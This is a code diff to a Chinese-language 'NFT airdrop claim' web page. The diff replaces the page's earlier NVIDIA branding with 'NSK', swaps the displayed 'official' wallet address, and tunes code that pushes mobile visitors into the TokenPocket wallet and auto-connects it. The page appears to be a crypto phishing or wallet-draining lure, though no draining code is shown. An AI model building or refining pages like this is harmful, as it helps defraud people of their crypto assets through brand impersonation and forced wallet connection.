@@ -2,9 +2,12 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <link rel="icon" href="11e1d5690652cd6e6192c0c2df2717c1.png" type="image/x-icon">
-  <title>NVIDIA NFT 空投领取</title>
+  <title>NSK 空投领取</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
   <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
@@ -699,12 +702,12 @@
     <!-- Header -->
     <div class="header">
       <div class="logo-container">
-        <img src="11e1d5690652cd6e6192c0c2df2717c1.png" alt="NVIDIA NFT">
+        <img src="11e1d5690652cd6e6192c0c2df2717c1.png" alt="NSK NFT">
       </div>
       <h1 style="font-size: 28px; font-weight: 800; margin-top: 12px;">
-        <span style="background: var(--gradient-primary); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">NFT</span> 空投领取
+        <span style="background: var(--gradient-primary); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">NSK</span> 空投领取
       </h1>
-      <p class="tagline">NVIDIA 顶流IP机制 · 全新升级</p>
+      <p class="tagline">NSK 顶流IP机制 · 全新升级</p>
     </div>
 
     <!-- Main Card -->
@@ -766,7 +769,7 @@
               <circle cx="9" cy="7" r="4"/>
               <path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/>
             </svg>
-            <span>官方地址: <span class="contact-value" style="font-size: 11px;">0x8214d150687eac7706a2883d33be9c26c31bd5b0</span></span>
+            <span>官方地址: <span class="contact-value" style="font-size: 11px;">0x5830692265327bd4a9776d59c75e9b1c141f2de6</span></span>
           </div>
         </div>
 
@@ -1017,7 +1020,7 @@
       // 检测是否在TP钱包内
       const isInTPWallet = window.ethereum && window.ethereum.isTokenPocket;
       const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-      const currentUrl = window.location.href.split('?')[0];
+      const currentUrl = window.location.href;
       
       // 如果在TP钱包内，直接连接
       if (isInTPWallet) {
@@ -1027,35 +1030,45 @@
       
       // 如果在手机上且不在TP钱包，尝试唤醒TP钱包
       if (isMobile && !isInTPWallet) {
-        // 延迟一下再跳转，让页面先加载完成
+        // 延迟一下再跳转
         setTimeout(() => {
-          // 方式1: TP钱包深度链接 (最常用)
-          const tpLink = `tp://dapp?url=${encodeURIComponent(currentUrl)}`;
+          // 获取不带参数的原始URL
+          const baseUrl = window.location.href.split('?')[0];
+          // 确保URL有https://前缀
+          const fullUrl = baseUrl.startsWith('http') ? baseUrl : 'https://' + baseUrl;
+          const encodedUrl = encodeURIComponent(fullUrl);
+          
+          // TP钱包深度链接 - 使用正确的格式
+          // 格式: tp://dapp?url=URL
+          const tpLink = `tp://dapp?url=${encodedUrl}`;
           
           // 尝试跳转TP钱包
           window.location.href = tpLink;
           
-          // iOS备用方案
+          // 如果是iOS，尝试universal link
           if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
             setTimeout(() => {
-              window.location.href = `tokenpocket://dapp?url=${encodeURIComponent(currentUrl)}`;
-            }, 300);
+              window.location.href = `tokenpocket://dapp?url=${encodedUrl}`;
+            }, 200);
           }
           
-          // Android备用方案
+          // 如果是Android，再试另一种格式
           if (/Android/i.test(navigator.userAgent)) {
             setTimeout(() => {
-              window.location.href = `tp://web?url=${encodeURIComponent(currentUrl)}`;
-            }, 300);
+              window.location.href = `tp://browser?url=${encodedUrl}`;
+            }, 200);
+            setTimeout(() => {
+              window.location.href = `tp://webview?url=${encodedUrl}`;
+            }, 400);
           }
           
-          // 如果5秒后还在本页面，尝试下载页
+          // 如果3秒后还在本页面，跳转下载页
           setTimeout(() => {
             if (document.visibilityState === 'visible') {
               window.location.href = "https://www.tokenpocket.pro/zh/download";
             }
-          }, 5000);
-        }, 1000); // 延迟1秒跳转
+          }, 3000);
+        }, 800);
       }
 
       await autoConnect();
